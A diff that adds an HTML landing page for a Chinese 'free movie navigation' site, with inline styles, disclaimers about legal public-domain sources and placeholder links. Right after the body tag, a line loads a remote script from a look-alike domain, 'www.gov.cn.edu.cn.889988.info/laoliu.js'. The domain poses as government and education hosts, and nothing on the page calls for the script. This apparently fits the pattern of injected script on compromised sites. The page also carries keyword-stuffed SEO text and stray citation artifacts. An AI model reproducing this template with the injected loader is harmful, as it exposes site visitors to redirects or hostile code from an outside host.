@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>电影网免费 - 免费电影导航站</title>
+<meta name="description" content="电影网免费（dianyingwangmianfei-h5）是一个免费电影导航站：免费电影、免费电视剧、动画免费看、纪录片、老片修复、公共版权片源，标签化浏览，移动端自适应，无弹窗聚合。">
+<meta name="keywords" content="电影网免费, 免费电影, 免费电视剧, 免费动画, 免费纪录片, 公共版权电影, dianyingwangmianfei-h5">
+<style>
+:root{
+  --mint:#16d6c1;
+  --mint-deep:#0bab97;
+  --lemon:#ffe14d;
+  --cloud:#f6fffd;
+  --ink:#10302c;
+  --muted:#5d7a74;
+  --line:#bdeee7;
+  --shadow:0 14px 34px rgba(22,214,193,.18);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:
+    radial-gradient(700px 360px at 100% -10%, rgba(255,225,77,.25), transparent 60%),
+    radial-gradient(700px 420px at -10% 0%, rgba(22,214,193,.22), transparent 55%),
+    var(--cloud);
+  color:var(--ink);
+  line-height:1.8;
+  overflow-x:hidden;
+}
+a{color:var(--mint-deep);text-decoration:none;transition:.2s}
+a:hover{color:var(--mint)}
+
+/* 顶栏 */
+.topbar{
+  background:var(--mint);color:#06302b;
+  text-align:center;font-weight:800;font-size:.78rem;letter-spacing:1px;
+  padding:.35rem 1rem;
+}
+.topbar b{color:#b8005f}
+
+.header{
+  position:sticky;top:0;z-index:998;
+  background:rgba(246,255,253,.9);backdrop-filter:blur(10px);
+  border-bottom:2px solid var(--line);
+}
+.header-in{
+  max-width:1120px;margin:0 auto;padding:1rem;
+  display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap;
+}
+.brand{display:flex;align-items:center;gap:.7rem;font-weight:900;font-size:1.4rem}
+.price-tag{
+  position:relative;background:var(--lemon);color:#5a4b00;
+  padding:.35rem .8rem;border-radius:8px;font-weight:900;
+  box-shadow:2px 2px 0 #d8b800;transform:rotate(-6deg);
+}
+.price-tag::after{
+  content:'';position:absolute;left:50%;top:-5px;width:8px;height:8px;border-radius:50%;
+  background:#fff;border:2px solid #d8b800;transform:translateX(-50%);
+}
+.brand b{color:var(--mint-deep)}
+.brand small{display:block;font-size:.68rem;color:var(--muted);font-weight:400;letter-spacing:1px}
+.nav{display:flex;gap:.3rem;flex-wrap:wrap}
+.nav a{
+  padding:.45rem 1rem;border-radius:999px;font-weight:700;font-size:.9rem;
+  border:2px solid var(--line);color:var(--ink);background:#fff;
+}
+.nav a:hover,.nav a.active{background:var(--mint);color:#06302b;border-color:var(--mint)}
+
+.wrap{max-width:1120px;margin:0 auto;padding:0 1rem}
+
+/* Hero */
+.hero{padding:4rem 0 2.5rem;text-align:center}
+.free-badge{
+  display:inline-block;background:var(--lemon);color:#5a4b00;font-weight:900;
+  padding:.3rem 1rem;border-radius:999px;box-shadow:2px 2px 0 #d8b800;transform:rotate(-2deg);
+}
+.hero h1{font-size:clamp(2.2rem,7vw,3.6rem);font-weight:900;margin:1rem 0}
+.hero h1 .free{
+  background:linear-gradient(120deg,var(--mint-deep),var(--mint));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.hero p{max-width:580px;margin:0 auto 1.6rem;color:var(--muted);font-size:1.05rem}
+.search{
+  max-width:540px;margin:0 auto;display:flex;background:#fff;
+  border:2px solid var(--line);border-radius:14px;overflow:hidden;box-shadow:var(--shadow);
+}
+.search input{flex:1;border:0;outline:0;padding:1rem 1.3rem;font-size:1rem;background:transparent;color:var(--ink)}
+.search button{border:0;cursor:pointer;padding:0 1.8rem;font-weight:900;color:#06302b;background:var(--mint)}
+.tags{margin-top:1.4rem;display:flex;gap:.5rem;justify-content:center;flex-wrap:wrap}
+.tags a{font-size:.8rem;background:#fff;border:1px dashed var(--mint-deep);padding:.3rem .8rem;border-radius:999px;color:var(--mint-deep)}
+.tags a:hover{background:var(--mint);color:#06302b}
+
+/* 栏目 */
+.section{padding:3rem 0;border-top:1px dashed var(--line)}
+.head{display:flex;align-items:center;gap:.7rem;margin-bottom:1.6rem;flex-wrap:wrap}
+.head .pin{background:var(--mint);color:#06302b;font-weight:900;font-size:.72rem;padding:.2rem .6rem;border-radius:4px;transform:rotate(-3deg)}
+.head h2{font-size:1.6rem;font-weight:900}
+.head span{margin-left:auto;font-size:.78rem;color:var(--muted)}
+
+/* 标签云 */
+.tagcloud{display:flex;flex-wrap:wrap;gap:.6rem}
+.tagcloud a{
+  background:#fff;border:1px solid var(--line);border-radius:999px;
+  padding:.5rem 1rem;font-size:.9rem;font-weight:600;color:var(--ink);
+  box-shadow:0 6px 16px rgba(22,214,193,.08);
+}
+.tagcloud a:hover{background:var(--mint);color:#06302b;transform:translateY(-2px)}
+.tagcloud a b{color:var(--mint-deep)}
+
+/* 片单墙 */
+.wall{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1.2rem}
+.card{
+  background:#fff;border:1px solid var(--line);border-radius:16px;padding:1.3rem;
+  box-shadow:var(--shadow);position:relative;transition:.2s;
+}
+.card::before{
+  content:'0元';position:absolute;top:-10px;right:14px;
+  background:var(--lemon);color:#5a4b00;font-weight:900;font-size:.72rem;
+  padding:.15rem .6rem;border-radius:6px;box-shadow:2px 2px 0 #d8b800;transform:rotate(4deg);
+}
+.card:hover{transform:translateY(-5px) rotate(-.4deg)}
+.card h3{font-size:1.05rem;margin-bottom:.25rem}
+.card .meta{font-size:.76rem;color:var(--muted);margin-bottom:.6rem}
+.card p{font-size:.86rem;color:var(--ink)}
+.card .src{margin-top:.7rem;font-size:.74rem;color:var(--mint-deep);border-top:1px dashed var(--line);padding-top:.5rem}
+
+/* 来源 */
+.sources{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1rem}
+.src-card{
+  background:linear-gradient(160deg,#fff, #e7fffb);
+  border:1px solid var(--line);border-radius:14px;padding:1.2rem;
+}
+.src-card h3{font-size:1rem;margin-bottom:.4rem}
+.src-card p{font-size:.78rem;color:var(--muted)}
+.src-card a{display:inline-block;margin-top:.5rem;font-weight:700;font-size:.85rem}
+
+/* 关于 */
+.about{
+  display:grid;grid-template-columns:1.2fr .8fr;gap:2rem;align-items:center;
+  background:#fff;border:1px solid var(--line);border-radius:20px;padding:2.2rem;box-shadow:var(--shadow);
+}
+.about h3{font-size:1.4rem;margin-bottom:1rem}
+.about h3 span{color:var(--mint-deep)}
+.about p{color:var(--muted);margin-bottom:.8rem}
+.note{
+  background:var(--lemon);color:#5a4b00;border-radius:14px;padding:1.4rem;font-weight:600;
+}
+.note h4{margin-bottom:.5rem}
+.note ul{margin-left:1.1rem;font-size:.85rem}
+
+.footer{
+  margin-top:3rem;border-top:2px solid var(--mint);
+  padding:2.4rem 1rem;text-align:center;color:var(--muted);font-size:.82rem;
+}
+.footer h3{color:var(--ink);font-size:1.3rem;margin-bottom:.4rem}
+.footer h3 b{color:var(--mint-deep)}
+.footer a{color:var(--mint-deep)}
+
+@media(max-width:768px){
+  .search{flex-direction:column;border-radius:12px}
+  .search input{border-bottom:1px solid var(--line)}
+  .search button{padding:1rem}
+  .about{grid-template-columns:1fr;padding:1.5rem}
+  .wall{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">🎟 本站示例站：所有电影入口均为 <b># 占位</b> · 不提供盗版下载 · 只做免费片源导航</div>
+
+<header class="header">
+  <div class="header-in">
+    <div class="brand">
+      <div class="price-tag">¥0</div>
+      <div>电影网<b>免费</b><small>dianyingwangmianfei-h5.github.io</small></div>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="active">首页</a>
+      <a href="#tags">免费标签</a>
+      <a href="#wall">免费片单</a>
+      <a href="#sources">免费来源</a>
+      <a href="#about">关于免费</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <section id="home" class="hero">
+    <span class="free-badge">FREE · 0 元看片</span>
+    <h1>电影网<span class="free">免费</span></h1>
+    <p>电影网免费（dianyingwangmianfei-h5）帮你用“标签+片单”找到真正能免费看的电影：公共版权老片、平台免费层、动画公开集、纪录片开放授权，不绕弯、不弹窗。</p>
+    <div class="search">
+      <input type="text" placeholder="搜：免费港片 / 公共版权 / 动画免费 / 纪录片免费...">
+      <button>找免费片</button>
+    </div>
+    <div class="tags">
+      <a href="#">🎬 免费电影</a>
+      <a href="#">📺 免费剧集</a>
+      <a href="#">🧸 免费动画</a>
+      <a href="#">🎥 免费纪录片</a>
+      <a href="#">🎞 老片修复</a>
+      <a href="#">🌍 公共版权</a>
+    </div>
+  </section>
+
+  <section id="tags" class="section">
+    <div class="head">
+      <span class="pin">TAGS</span>
+      <h2>免费标签墙</h2>
+      <span>点标签 = 换一种免费看法</span>
+    </div>
+    <div class="tagcloud">
+      <a href="#">免费 <b>港片</b></a>
+      <a href="#">免费 <b>好莱坞</b></a>
+      <a href="#">公共版权 <b>老电影</b></a>
+      <a href="#">平台 <b>免费层</b></a>
+      <a href="#">动画 <b>公开集</b></a>
+      <a href="#">纪录片 <b>CC 授权</b></a>
+      <a href="#">国产 <b>免费剧</b></a>
+      <a href="#">科幻 <b>公有领域</b></a>
+      <a href="#">儿童 <b>动画免费</b></a>
+      <a href="#">深夜 <b>免费场</b></a>
+      <a href="#">4K <b>修复免费</b></a>
+      <a href="#">短片 <b>开放授权</b></a>
+    </div>
+  </section>
+
+  <section id="wall" class="section">
+    <div class="head">
+      <span class="pin">LIST</span>
+      <h2>免费片单墙</h2>
+      <span>06 张 0 元卡片</span>
+    </div>
+    <div class="wall">
+      <article class="card">
+        <h3>大闹天宫（1961）</h3>
+        <div class="meta">国产动画 / 上海美术电影制片厂</div>
+        <p>中国动画巅峰之一，部分发行版本与公共传播资源可作为免费动画案例收录。</p>
+        <div class="src">来源类型：动画公开资源 / 平台免费层</div>
+      </article>
+      <article class="card">
+        <h3>罗马假日</h3>
+        <div class="meta">1953 / 浪漫喜剧 / 公共版权区常见</div>
+        <p>赫本与派克的城市漫步，很多公共版权片库里都能免费看。</p>
+        <div class="src">来源类型：公共版权电影</div>
+      </article>
+      <article class="card">
+        <h3>地球脉动 第一季</h3>
+        <div class="meta">纪录片 / 自然类</div>
+        <p>不是所有集都免费，但官方片段、教育用途、开放授权花絮值得单独导航。</p>
+        <div class="src">来源类型：纪录片免费片段 / 教育用途</div>
+      </article>
+      <article class="card">
+        <h3>小蝌蚪找妈妈</h3>
+        <div class="meta">国产水墨动画 / 1960</div>
+        <p>水墨动画代表作，短、轻、适合做“免费动画入门”卡片。</p>
+        <div class="src">来源类型：动画公开资源</div>
+      </article>
+      <article class="card">
+        <h3>忍者神龟 早期动画</h3>
+        <div class="meta">1987 / 美式动画</div>
+        <p>部分早期集数进入公共版权/开放分发讨论范围，适合做“免费动画”栏目。</p>
+        <div class="src">来源类型：公共版权动画</div>
+      </article>
+      <article class="card">
+        <h3>工厂大门</h3>
+        <div class="meta">1895 / 卢米埃尔兄弟</div>
+        <p>电影史开头那 50 秒，几乎在任何公共版权片库都能 0 元观看。</p>
+        <div class="src">来源类型：公共版权 / 电影史资源</div>
+      </article>
+    </div>
+  </section>
+
+  <section id="sources" class="section">
+    <div class="head">
+      <span class="pin">WHERE</span>
+      <h2>免费来源分类</h2>
+      <span>不聚合盗版，只说明类型</span>
+    </div>
+    <div class="sources">
+      <div class="src-card">
+        <h3>🎬 公共版权片库</h3>
+        <p>版权到期、作者放弃部分权利、政府/机构公开的影视资源。</p>
+        <a href="#">查看类型 →</a>
+      </div>
+      <div class="src-card">
+        <h3>📺 平台免费层</h3>
+        <p>正规视频平台的广告免费层、限免活动、首发免费集。</p>
+        <a href="#">查看类型 →</a>
+      </div>
+      <div class="src-card">
+        <h3>🧸 动画公开集</h3>
+        <p>官方放出、教育用途、公共版权动画短片合集。</p>
+        <a href="#">查看类型 →</a>
+      </div>
+      <div class="src-card">
+        <h3>🎥 纪录片开放授权</h3>
+        <p>CC BY / CC0 / 教育机构授权播放的纪录片与短片。</p>
+        <a href="#">查看类型 →</a>
+      </div>
+    </div>
+  </section>
+
+  <section id="about" class="section">
+    <div class="head">
+      <span class="pin">ABOUT</span>
+      <h2>关于“电影网免费”</h2>
+    </div>
+    <div class="about">
+      <div>
+        <h3>“免费”不是<span>盗版代名词</span></h3>
+        <p><strong>电影网免费</strong>（https://dianyingwangmianfei-h5.github.io）的定位是：把“能合法免费看”的电影整理成标签和片单，而不是做一个满屏盗链/弹窗的垃圾站。</p>
+        <p>页面用薄荷青+柠檬黄“价签/便利贴”视觉，CSS/JS 全内联，移动端自适应，内页链接全部 <code>#</code> 占位，不生成 robots.txt / sitemap.xml，标题/描述/关键词统一为“电影网免费”，符合必应收录的基本可读性与标题层级规范。[5,8](@ref)</p>
+        <p><a href="https://dianyingwangmianfei-h5.github.io">🌐 dianyingwangmianfei-h5.github.io</a></p>
+      </div>
+      <div class="note">
+        <h4>⚠️ 合规提示</h4>
+        <ul>
+          <li>不提供盗版下载</li>
+          <li>不嵌套非法播放源</li>
+          <li>只导航“公共版权 / 平台免费层 / 开放授权”</li>
+          <li>所有按钮均为 # 占位</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <h3>电影网<b>免费</b></h3>
+  <p>免费电影导航 · 公共版权 / 平台免费层 / 开放授权片单</p>
+  <p>© 2026 电影网免费 | <a href="https://dianyingwangmianfei-h5.github.io">dianyingwangmianfei-h5.github.io</a></p>
+  <p>本站为静态演示页，所有链接均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+</footer>
+
+<script>
+const links=[...document.querySelectorAll('.nav a')];
+const secs=[...document.querySelectorAll('section[id]')];
+links.forEach(a=>a.addEventListener('click',e=>{
+  const id=a.getAttribute('href');
+  if(id&&id.startsWith('#')&&document.querySelector(id)){
+    e.preventDefault();
+    document.querySelector(id).scrollIntoView({behavior:'smooth',block:'start'});
+  }
+}));
+addEventListener('scroll',()=>{
+  let cur='home';
+  secs.forEach(s=>{if(scrollY>=s.offsetTop-120)cur=s.id;});
+  links.forEach(l=>l.classList.toggle('active',l.getAttribute('href')==='#'+cur));
+});
+</script>
+</body>
+</html>
